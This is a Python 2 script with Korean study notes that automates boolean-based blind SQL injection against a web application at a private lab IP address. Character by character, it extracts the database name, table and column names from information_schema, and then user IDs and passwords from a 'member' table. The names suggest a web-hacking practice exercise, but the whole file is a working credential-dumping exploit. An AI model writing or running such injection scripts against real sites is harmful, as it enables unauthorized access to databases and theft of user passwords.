#-*- coding:utf-8 -*-
import requests
str_alpha = ['_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','1','2','3','4','5','6','7','8','9','0'] #97~122
'''
1. 데이터베이스 길이 및 데이터베이스 명 빼오기
2. 파이썬으로 자동화해보기 * 참거짓 구분을 코드상으로 뭘로하는가?
                                     * 서버측응답코드(Status Code),  Content-Length 등
                                     * 문자열 구분 등
3. 데이터베이스 명을 통해, 테이블 명 뽑기
substr((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=[DB명]), 1,1);
substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=[DB명] limit 0,1), 1,1)
4. 데이터베이스 명과 테이블 명을 통해, 컬럼 명 뽑기
   ex) board 테이블: bbs_no, bbs_title ...
        user 테이블: idx, ....
5. 유저 테이블에 있는 아이디 패스워드 뽑기
'''
url = "http://192.168.177.130:5000/main/view?bbs_no=5"
user_url = "http://192.168.177.130:5000/myinfo_revision"
def check_db_length(): #데이터베이스 명 길이
    for x in range(9,13):
        data = " and length(database())={}".format(x)
        url_data = url + data
        req = requests.get(url_data)
        if req.status_code == 200:
            return x
    pass

def check_db_name(): #데이터베이스 이름
    database_name = ""
    for index in range(1, 11): #num instaed of check_db_length()
        for str_x in str_alpha:
            data = " and substr(database(),{},1)='{}'".format(index, str_x)
            url_data = url + data            
            req = requests.get(url_data)            
            if req.status_code == 200:                
                database_name += str_x
    return database_name

def check_db_count_table(): #찾은 데이터베이스의 테이블 개수
    for index in range(1, 11): #num instaed of check_db_length()
        data = " and substr((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='webhacking'), 1,1)='{}'".format(index)
        url_data = url + data            
        req = requests.get(url_data)            
        if req.status_code == 200:
            return index
    pass

def check_db_table(): #찾은 데이터베이스의 테이블 이름들
    dump = []
    table_name=''
    table_name2=''
    for limit_num in range(2):
        for index in range(1, 10):
            for str_al in str_alpha: #num instaed of check_db_length()            
                data = " and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='webhacking' limit {},1), {},1)='{}'".format(limit_num, index, str_al)
                url_data = url + data
                req = requests.get(url_data)
                if req.status_code == 200 and limit_num == 0:
                    table_name += str_al
                elif req.status_code == 200 and limit_num == 1:
                    table_name2 += str_al
    dump.append(table_name)
    dump.append(table_name2)    
    return dump

def check_db_table_of_col(): #찾은 데이터베이스의 테이블의 컬럼 이름들
    dump = []
    col_name=''
    
    for index in range(1, 10):
        for str_al in str_alpha: #num instaed of check_db_length()            
            data = " and substr((select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='member' limit 0,1), {},1)='{}'".format(index, str_al)
            url_data = url + data
            req = requests.get(url_data)
            if req.status_code == 200:
                col_name += str_al
                print str_al
    #dump.append(table_name)
    return col_name

def hacking_id(): #유저 테이블의 아이디 
    user_id=''
    for index in range(1, 10):
        for str_al in str_alpha: #num instaed of check_db_length()            
            data = " and substr((select user_id from member limit 0,1), {},1)='{}'".format(index, str_al)
            url_data = url + data
            req = requests.get(url_data)
            if req.status_code == 200:
                user_id += str_al
                #print str_al    
    return user_id

def hacking_pass(): #유저 테이블의 비밀번호
    user_pw=''
    for index in range(1, 10):
        for str_al in str_alpha: #num instaed of check_db_length()            
            data = " and substr((select user_pass from member limit 0,1), {},1)='{}'".format(index, str_al)
            url_data = url + data
            req = requests.get(url_data)
            if req.status_code == 200:
                user_pw += str_al
                #print str_al    
    return user_pw


if __name__=="__main__":
    #print check_db_length()
    #print check_db_name()
    #print check_db_count_table()
    #print check_db_table()
    #print check_db_table_of_col()
    #print hacking_id()
    print hacking_pass()

